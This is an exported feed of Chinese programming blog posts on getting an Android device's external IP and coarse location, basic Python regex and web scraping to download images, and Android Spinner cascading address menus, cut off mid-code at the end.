<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getAddress</span><span class="params">(<span class="keyword">final</span> Handler handler, String ip)</span> </span>&#123;</div><div class="line">    <span class="comment">//定位信息请求地址</span></div><div class="line">    String url = <span class="string">"http://apis.baidu.com/apistore/iplookupservice/iplookup"</span>;</div><div class="line">    AsyncHttpClient client = <span class="keyword">new</span> AsyncHttpClient();</div><div class="line">    client.addHeader(<span class="string">"apikey"</span>, <span class="string">"这里填你自己百度API商店注册后的apikey"</span>);</div><div class="line">    RequestParams params = <span class="keyword">new</span> RequestParams();</div><div class="line">    params.add(<span class="string">"ip"</span>, ip); <span class="comment">//添加参数</span></div><div class="line">    client.get(url, params, <span class="keyword">new</span> AsyncHttpResponseHandler() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(<span class="keyword">int</span> arg0, Header[] arg1, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            String response = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                response = <span class="keyword">new</span> String(bytes, <span class="string">"GBK"</span>); <span class="comment">//获取服务器返回数据</span></div><div class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">            Message msg = <span class="keyword">new</span> Message();</div><div class="line">            msg.obj = response;</div><div class="line">            handler.sendMessage(msg);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="keyword">int</span> arg0, Header[] arg1, <span class="keyword">byte</span>[] bytes, Throwable arg3)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            String response = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                response = <span class="keyword">new</span> String(bytes, <span class="string">"GBK"</span>);</div><div class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">            System.out.println(response);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="执行请求"><a href="#执行请求" class="headerlink" title="执行请求"></a>执行请求</h5><p>　　在 mIpHandler 接收到 ip 地址后，再调用获取定位信息的 Http 方法（即在 mIpHandler 的 handleMessage 方法的最后加入下面这行代码）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">IpHttpUtil.getAddress(mCityHandler, res); <span class="comment">//发送获取定位信息的http请求</span></div></pre></td></tr></table></figure>
<h4 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h4><p>　　我们在获取 ip 地址那篇博客的例子的基础上增加了一个 TextView 来显示本篇博客获取的定位信息，如下图所示，我们获取并显示了得到的 JSON 格式的返回数据，即通过该 ip 地址获得的定位信息。如下图所示，我们可以看到已经获得了服务器返回的 JSON 数据，但是可以很清楚的看到，显示的 unicode 编码，并不是汉字，那就需要将接收到的数据转化成汉字咯。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/12-2.jpg" alt="12-2"></p>
<p>　　在网上摘抄了一段 unicode 转汉字的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> String <span class="title">decodeUnicode</span><span class="params">(String theString)</span> </span>&#123;</div><div class="line">        <span class="keyword">char</span> aChar;</div><div class="line">        <span class="keyword">int</span> len = theString.length();</div><div class="line">        StringBuffer outBuffer = <span class="keyword">new</span> StringBuffer(len);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &amp;lt; len;) &#123;</div><div class="line">            aChar = theString.charAt(x++);</div><div class="line">            <span class="keyword">if</span> (aChar == <span class="string">'\\'</span>) &#123;</div><div class="line">                aChar = theString.charAt(x++);</div><div class="line">                <span class="keyword">if</span> (aChar == <span class="string">'u'</span>) &#123;</div><div class="line">                    <span class="comment">// Read the xxxx</span></div><div class="line">                    <span class="keyword">int</span> value = <span class="number">0</span>;</div><div class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &amp;lt; <span class="number">4</span>; i++) &#123;</div><div class="line">                        aChar = theString.charAt(x++);</div><div class="line">                        <span class="keyword">switch</span> (aChar) &#123;</div><div class="line">                        <span class="keyword">case</span> <span class="string">'0'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'1'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'2'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'3'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'4'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'5'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'6'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'7'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'8'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'9'</span>:</div><div class="line">                            value = (value &amp;lt;&amp;lt; <span class="number">4</span>) + aChar - <span class="string">'0'</span>;</div><div class="line">                            <span class="keyword">break</span>;</div><div class="line">                        <span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'c'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'e'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">                            value = (value &amp;lt;&amp;lt; <span class="number">4</span>) + <span class="number">10</span> + aChar - <span class="string">'a'</span>;</div><div class="line">                            <span class="keyword">break</span>;</div><div class="line">                        <span class="keyword">case</span> <span class="string">'A'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'B'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'C'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'D'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">                        <span class="keyword">case</span> <span class="string">'F'</span>:</div><div class="line">                            value = (value &amp;lt;&amp;lt; <span class="number">4</span>) + <span class="number">10</span> + aChar - <span class="string">'A'</span>;</div><div class="line">                            <span class="keyword">break</span>;</div><div class="line">                        <span class="keyword">default</span>:</div><div class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</div><div class="line">                                    <span class="string">"Malformed   \\uxxxx   encoding."</span>);</div><div class="line">                        &#125;</div><div class="line"> </div><div class="line">                    &#125;</div><div class="line">                    outBuffer.append((<span class="keyword">char</span>) value);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">if</span> (aChar == <span class="string">'t'</span>)</div><div class="line">                        aChar = <span class="string">'\t'</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (aChar == <span class="string">'r'</span>)</div><div class="line">                        aChar = <span class="string">'\r'</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (aChar == <span class="string">'n'</span>)</div><div class="line">                        aChar = <span class="string">'\n'</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (aChar == <span class="string">'f'</span>)</div><div class="line">                        aChar = <span class="string">'\f'</span>;</div><div class="line">                    outBuffer.append(aChar);</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span></div><div class="line">                outBuffer.append(aChar);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> outBuffer.toString();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>　　使用此方法将接收到的字符处理后即可获得获得汉字显示，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/12-3.jpg" alt="12-3"></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>ip</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 获取外网 ip 地址详解</title>
    <url>/2016/07/10/Android%20%E8%8E%B7%E5%8F%96%E5%A4%96%E7%BD%91%20ip%20%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>　　很多 App 都需要获取当前所在位置，如果需要获取精确地位置当然是使用 GPS 定位啦，但是有时候不需要那么精确的定位，而且手机开启 GPS 进行定位需要用户手动打开 GPS 开关，那么如何无声无息的在后台进行定位呢？其实，只要获取到本机的外网 ip 地址就能够获取你的所在大概地址啦！此篇博客主要讲解如何获取外网 ip，如何通过 ip 进行定位将写在下一篇博客中。</p>
<a id="more"></a>
<h4 id="获取外网ip地址"><a href="#获取外网ip地址" class="headerlink" title="获取外网ip地址"></a>获取外网ip地址</h4><h5 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h5><p>　　想必很多人都查过本机的外网 ip 地址，通过 cmd 的 config 等命令看到的都是内网 ip，要想查看外网 ip 有一个很简单的办法就是在百度输入 ip，点击搜索即可看到自己的外网 ip，这个结果通常是由 www.ip138.com 这个网站提供的，我们点进去可以看到他其实提供了ip地址查询服务。那我们就可以把这个利用起来，这里其实会用到类似爬虫的技术，也就是把网页源代码下下来，然后从源代码中提取 ip 地址。打开浏览器的开发者工具，定位 ip 地址那一行代码，可以看到如下代码：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/10-1.jpg" alt="10-1"></p>
<p>　　我们对<a href="http://1212.ip138.com/ic.asp发送一个get请求即可获得服务器返回的ip地址信息。" target="_blank" rel="external">http://1212.ip138.com/ic.asp发送一个get请求即可获得服务器返回的ip地址信息。</a></p>
<h5 id="android-async-http"><a href="#android-async-http" class="headerlink" title="android-async-http"></a>android-async-http</h5><p>　　在 AndroidManifest.xml 文件中加入如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</div></pre></td></tr></table></figure>
<p>　　下载第三方网络请求库：android-async-http 的 jar 包</p>
<p>　　将 jar 包添加到工程，复制到 lib 文件夹下，并右键该 jar 包，点击 BuildPath，然后点击 Add to Build Path。</p>
<h5 id="获取网站返回信息"><a href="#获取网站返回信息" class="headerlink" title="获取网站返回信息"></a>获取网站返回信息</h5><p>　　对 <a href="http://1212.ip138.com/ic.asp" target="_blank" rel="external">http://1212.ip138.com/ic.asp</a> 发送一个 get 请求来获得服务器返回的ip地址信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IpHttpUtil</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetNetIp</span><span class="params">(<span class="keyword">final</span> Handler handler, String url)</span> </span>&#123;</div><div class="line">        AsyncHttpClient client = <span class="keyword">new</span> AsyncHttpClient();</div><div class="line">        client.get(url, <span class="keyword">new</span> AsyncHttpResponseHandler() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(<span class="keyword">int</span> arg0, Header[] arg1, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String ipLine = <span class="keyword">null</span>;</div><div class="line">                String response = <span class="keyword">null</span>;</div><div class="line">                <span class="keyword">try</span> &#123;</div><div class="line">                    <span class="comment">//字节转字符串，并指定编码方式为GBK，否则会乱码</span></div><div class="line">                    response = <span class="keyword">new</span> String(bytes, <span class="string">"GBK"</span>); </div><div class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">                    <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">                System.out.println(<span class="string">"返回的信息"</span> + response); <span class="comment">//打印返回信息</span></div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="keyword">int</span> arg0, Header[] arg1, <span class="keyword">byte</span>[] bytes,</span></span></div><div class="line">            Throwable arg3) &#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                String response = <span class="keyword">new</span> String(bytes);</div><div class="line">                System.out.println(response);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　返回信息如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/10-2.jpg" alt="10-2"></p>
<h5 id="Java正则表达式取出字符串"><a href="#Java正则表达式取出字符串" class="headerlink" title="Java正则表达式取出字符串"></a>Java正则表达式取出字符串</h5><p>　　我们要从网站返回的 html 中提取 ip 地址则可以通过正则表达式来进行匹配：</p>
<p>　　提取中括号内容的规则：\[.*\]，对 Http 请求得到的 response 进行正则匹配，得到字符串：[xxx.xxx.xxx.xxx]，然后再进行字符串切割，取出 ip 地址。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//匹配中括号及其之间的内容</span></div><div class="line">Pattern pattern = Pattern.compile(<span class="string">"\\[.*\\]"</span>); </div><div class="line">Matcher matcher = pattern.matcher(response.toString());</div><div class="line"><span class="keyword">if</span> (matcher.find()) &#123;</div><div class="line">    ipLine = matcher.group();</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!ipLine.isEmpty())&#123;</div><div class="line">    <span class="comment">//去掉左右两边的中括号</span></div><div class="line">    ipLine = ipLine.substring(<span class="number">1</span>, ipLine.length() - <span class="number">1</span>); </div><div class="line">&#125;</div><div class="line">System.out.println(<span class="string">"ip地址："</span> + ipLine);</div></pre></td></tr></table></figure>
<p>　　将获取到的数据通过 Handler 传回到 Activity：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//将得到的ip地址传递给Activity进行显示</span></div><div class="line">Message msg = <span class="keyword">new</span> Message();</div><div class="line">msg.obj = ipLine;</div><div class="line">handler.sendMessage(msg);</div></pre></td></tr></table></figure></p>
<p>　　在 Activity 中调用 Http 请求：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> TextView mName, mIp;</div><div class="line">    <span class="keyword">private</span> Handler mIpHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</div><div class="line">            String res = (String) msg.obj; <span class="comment">//取出通过Handler传递过来的字符串</span></div><div class="line">            System.out.println(<span class="string">"MainActivity:"</span> + res);</div><div class="line">            mIp.setText(res); <span class="comment">//显示到界面</span></div><div class="line">        &#125;;</div><div class="line">    &#125;;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        </div><div class="line">        mName = (TextView) findViewById(R.id.tv_name);</div><div class="line">        mIp = (TextView) findViewById(R.id.tv_ip);</div><div class="line">        </div><div class="line">        mName.setText(<span class="string">"你的外网ip地址是："</span>);</div><div class="line">        </div><div class="line">        <span class="comment">//发送Http请求</span></div><div class="line">        String url = <span class="string">"http://1212.ip138.com/ic.asp"</span>;</div><div class="line">        IpHttpUtil.GetNetIp(mIpHandler, url);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/10-3.jpg" alt="10-3"></p>
<p>　　获取了本机的外网 ip 之后就可以通过这个 ip 来进行定位啦！欲知后事如何，请看下回分解！</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>ip</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 爬虫基础 - 正则表达式与 Http 请求</title>
    <url>/2016/07/03/Python%20%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%20-%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8E%20Http%20%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>　　网络爬虫又称为网络机器人，它可以按照程序设定的规则自动抓取网页上的信息。网络是信息的海洋，但是网络中的数据是零散的、无序的且存在着冗余，如何从复杂的网页代码中提取有用的信息便是爬虫需要解决的问题。 Python 语法简洁，代码风骚，数据的处理能力强，比如函数参数的打包解包，列表解析，矩阵处理，非常方便，所以 Python 非常适合做网络爬虫。我将在这里很大家分享我的一些网络爬虫小程序，让我们一起体验爬虫带来的乐趣吧！</p>
<a id="more"></a>
<h4 id="基本正则表达式"><a href="#基本正则表达式" class="headerlink" title="基本正则表达式"></a>基本正则表达式</h4><h5 id="导入re模块"><a href="#导入re模块" class="headerlink" title="导入re模块"></a>导入re模块</h5><p>　　导入 Python 正则表达式模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div></pre></td></tr></table></figure>
<p>　　Python 通过 re 模块提供对正则表达式的支持。</p>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li><p>findall： 匹配所有符合规律的内容，返回包含结果的列表</p>
</li>
<li><p>Search：匹配并提取第一个符合规律的内容，返回一个正则表达式对象（object)</p>
</li>
<li><p>Sub：替换符合规律的内容，返回替换后的值</p>
</li>
</ul>
<h5 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h5><ul>
<li><p>，，问号与括号</p>
</li>
<li><p>点号.  :  匹配任意字符，换行符 \n 除外</p>
</li>
<li><p>星号* ：匹配前一个字符 0 次或无限次</p>
</li>
<li><p>问号? ：匹配前一个字符 0 次或 1 次</p>
</li>
<li><p>贪心算法：.*</p>
</li>
<li><p>非贪心算法：.*?</p>
</li>
<li><p>括号（）：括号内的数据作为结果返回</p>
</li>
</ul>
<h5 id="常用情况"><a href="#常用情况" class="headerlink" title="常用情况"></a>常用情况</h5><ul>
<li><p>使用 findall 与 search 从大量文本中匹配感兴趣的内容</p>
</li>
<li><p>使用 sub 实现换页功能</p>
</li>
</ul>
<h4 id="Http网络请求"><a href="#Http网络请求" class="headerlink" title="Http网络请求"></a>Http网络请求</h4><p><strong>requests模块</strong></p>
<p>　　Requests 是用Python语言编写，基于 urllib，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。</p>
<h5 id="导入requests模块"><a href="#导入requests模块" class="headerlink" title="导入requests模块"></a>导入requests模块</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div></pre></td></tr></table></figure>
<h5 id="基本Get请求"><a href="#基本Get请求" class="headerlink" title="基本Get请求"></a>基本Get请求</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-   //定义编码为utf-8，避免显示乱码</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">url = <span class="string">'http://www.baidu.com'</span>   </div><div class="line">r = requests.get(url)   //使用requests模块的get方法获取百度首页的源代码</div><div class="line"><span class="keyword">print</span> r.text</div></pre></td></tr></table></figure>
<p>　　这里只举例了我们要使用的基本的 get 请求，如果需要了解更多的 requests 模块的方法请自行百度。</p>
<h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><p>　　目的：爬取湖南农业大学官网中心位置的三张图片，并且下载下来。</p>
<h5 id="获取图片的源代码"><a href="#获取图片的源代码" class="headerlink" title="获取图片的源代码"></a>获取图片的源代码</h5><p>　　使用 Chrome 打开农大官网，右键审查元素，然后点击左上角的放大镜，点击图片就会定位到图片的源代码位置，如图所示：</p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2016/7/3-1.jpg" alt="3-1"></p>
<h5 id="分析源代码，写出正则表达式"><a href="#分析源代码，写出正则表达式" class="headerlink" title="分析源代码，写出正则表达式"></a>分析源代码，写出正则表达式</h5><p>　　分析上图可知，我们需要的部分为 <code>src=&quot;&quot;</code> 中引号里面的 url，而三张图片都是相同的格式，所以我们使用 re 模块的 findall 方法，将 src 的中间部分获取到即可：<code>re.findall(&#39;img src=&quot;(.*?)&quot; width=&quot;990&quot;&#39;,html.text,re.S)</code><br>（1）<code>findall</code> 即匹配所有符合正则表达式规则的内容<br>（2）<code>(.*?)</code> 用作获取 <code>src=&quot;&quot;</code> 的双引号中间的 url 并返回<br>（3）<code>re.S</code> 的作用是使 <code>.</code> 的作用范围包括换行符，即可以换行匹配</p>
<h5 id="根据获取到的url下载图片"><a href="#根据获取到的url下载图片" class="headerlink" title="根据获取到的url下载图片"></a>根据获取到的url下载图片</h5><p>　　因为我们获取到的 url 并不是完整的网址，所以右键上图的链接选择 Open link in new tab 来查看完整的网址，如下图，因此我们在下载图片时需要在 url 前加上 <a href="http://www.hunau.edu.cn/。" target="_blank" rel="external">http://www.hunau.edu.cn/。</a></p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2016/7/3-2.jpg" alt="3-2"></p>
<p>　　代码如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> re   //导入正则表达式的库</div><div class="line"><span class="keyword">import</span> requests   //导入第三方http库</div><div class="line">html = requests.get(<span class="string">"http://www.hunau.edu.cn/"</span>)  //通过get方法获取农大官网的网页源代码</div><div class="line">html.encoding = <span class="string">'utf-8'</span>   //设定编码方式，使能够正常显示中文</div><div class="line"><span class="comment"># print(html.text)   //也可以把网页源代码输出来看一下</span></div><div class="line"></div><div class="line">homedir = os.getcwd()   //获取项目当前路径</div><div class="line">os.mkdir(homedir+<span class="string">'\pic'</span>)   //创建pic文件夹，用于保存图片</div><div class="line"></div><div class="line">pic_url = re.findall(<span class="string">'img src="(.*?)" width="990"'</span>,html.text,re.S)   //设定正则表达式，爬取图片的url</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> each <span class="keyword">in</span> pic_url:   //遍历pic_url</div><div class="line">    <span class="keyword">print</span> <span class="string">'now downloading:'</span> + each</div><div class="line">    pic = requests.get(<span class="string">"http://www.hunau.edu.cn/"</span>+each) //补充完整的网址，通过get方法获取图片 </div><div class="line">    fp = open(<span class="string">'pic\\'</span> + str(i) + <span class="string">'.jpg'</span>,<span class="string">'wb'</span>)  //在pic文件夹下创建jpg格式的文件</div><div class="line">    fp.write(pic.content)  //将图片写入到工程文件夹下的pic文件夹中</div><div class="line">    fp.close()   </div><div class="line">    i += <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>　　文本爬虫，效果如下：</p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2016/7/3-3.jpg" alt="3-3"></p>
<p>　　<strong>我们在这里只是爬取了三张图片，但是使用 python 来做网页爬虫真的功能很强大，大家可以试一试修改代码去爬取更多的图片。</strong></p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>Python</tag>
        <tag>正则表达式</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Spinner 控件之省市区（县）三级联动</title>
    <url>/2016/07/01/Android%20Spinner%E6%8E%A7%E4%BB%B6%E4%B9%8B%E7%9C%81%E5%B8%82%E5%8C%BA%EF%BC%88%E5%8E%BF%EF%BC%89%E4%B8%89%E7%BA%A7%E8%81%94%E5%8A%A8/</url>
    <content><![CDATA[<p>　　使用 Spinner 控件实现省市区三级联动在很多地方都需要用到，比如用户个人信息填写、快递地址填写等场景，这是一个比较基本的功能，但是实现起来却有点麻烦，因为要加载很多的资源数组。掌握基本的省市区三级联动很有必要，当然，再加上一些酷炫的 UI 设计就能更 nice。</p>
<a id="more"></a>
<h4 id="布局文件"><a href="#布局文件" class="headerlink" title="布局文件"></a>布局文件</h4><p>　　添加三个 Spinner 控件，分别用于省、市、区（县）：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></div><div class="line">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></div><div class="line">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> &gt;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Spinner</span></span></div><div class="line">        <span class="attr">android:id</span>=<span class="string">"@+id/spinner_province"</span></div><div class="line">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></div><div class="line">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></div><div class="line">        <span class="attr">android:layout_marginTop</span>=<span class="string">"10dp"</span></div><div class="line">        <span class="attr">android:layout_weight</span>=<span class="string">"1.2"</span> &gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">Spinner</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Spinner</span></span></div><div class="line">        <span class="attr">android:id</span>=<span class="string">"@+id/spinner_city"</span></div><div class="line">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></div><div class="line">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></div><div class="line">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"4dp"</span></div><div class="line">        <span class="attr">android:layout_marginTop</span>=<span class="string">"10dp"</span></div><div class="line">        <span class="attr">android:layout_weight</span>=<span class="string">"1.2"</span> &gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">Spinner</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Spinner</span></span></div><div class="line">        <span class="attr">android:id</span>=<span class="string">"@+id/spinner_county"</span></div><div class="line">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></div><div class="line">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></div><div class="line">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"4dp"</span></div><div class="line">        <span class="attr">android:layout_marginTop</span>=<span class="string">"10dp"</span></div><div class="line">        <span class="attr">android:layout_weight</span>=<span class="string">"1.8"</span> &gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">Spinner</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="逻辑实现"><a href="#逻辑实现" class="headerlink" title="逻辑实现"></a>逻辑实现</h4><p>　　实现原理：为每一个 Spinner 添加监听，选择省份后加载该省份的市区（县）数组资源，选择市之后加载该市对应的区（县）数组资源，从而实现三级联动。</p>
<p>　　代码有点多，这里只贴了核心代码，资源数组与定义的资源数组ID数组都没有写出来了，目前博客的下载插件还没弄好，暂时无法提供下载，，如果需要源码可以联系我联系方式在主页可看到。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> Spinner mProvinceSpinner, mCitySpinner, mCountySpinner;</div><div class="line">    <span class="keyword">private</span> ArrayAdapter&lt;CharSequence&gt; mProvinceAdapter, mCityAdpater,</div><div class="line">            mCountyAdapter;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mProvinceId, mCityId;</div><div class="line">    <span class="keyword">private</span> String mProvinceName, mCityName, mCountyName;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        mProvinceSpinner = (Spinner) findViewById(R.id.spinner_province);</div><div class="line">        mCitySpinner = (Spinner) findViewById(R.id.spinner_city);</div><div class="line">        mCountySpinner = (Spinner) findViewById(R.id.spinner_county);</div><div class="line"></div><div class="line">        <span class="comment">// 省份选择</span></div><div class="line">        mProvinceAdapter = ArrayAdapter.createFromResource(<span class="keyword">this</span>,</div><div class="line">                R.array.province_item, android.R.layout.simple_spinner_item);</div><div class="line">        mProvinceAdapter</div><div class="line">                